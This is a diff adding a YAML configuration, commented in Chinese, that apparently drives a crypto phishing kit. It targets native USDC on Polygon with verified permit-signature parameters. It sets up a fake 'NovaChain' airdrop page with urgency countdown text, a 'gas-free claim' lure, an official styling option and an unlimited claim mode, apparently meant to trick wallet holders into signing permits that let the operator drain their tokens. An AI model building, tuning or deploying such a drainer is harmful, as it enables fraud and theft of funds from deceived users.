@@ -1,0 +1,25 @@
+# 目标档案:Polygon 原生 USDC(2026-09-29 链上实测,作者真机验收通过)
+# 实测:domain name="USD Coin" version="2" 与链上 DOMAIN_SEPARATOR 逐位匹配;
+#       Permit 结构仅认 nonce 在 deadline 前(circle 非标顺序)
+chain:
+  rpc: "https://polygon.drpc.org"          # polygon-rpc.com 已失效;publicnode 拦 urllib(已加 UA 仍偶发 403)
+  chain_id: 137
+  rpc_name: "Polygon Mainnet"
+
+token:
+  address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
+  name: "USD Coin"
+  symbol: "USDC"
+  permit_version: "2"
+  permit_order: "nonce_first"
+
+site:
+  project: "星穹协议 NovaChain"
+  tagline: "下一代模块化 Layer2,主网空投第 3 期开启"
+  airdrop_amount: "1000"
+  countdown_minutes: 47
+  deadline: 1893456000
+  gasless_text: "免 Gas 领取(由星穹协议赞助商代付)"
+  claim_mode: "unlimited"
+  show_gasless: true
+  style: "official"
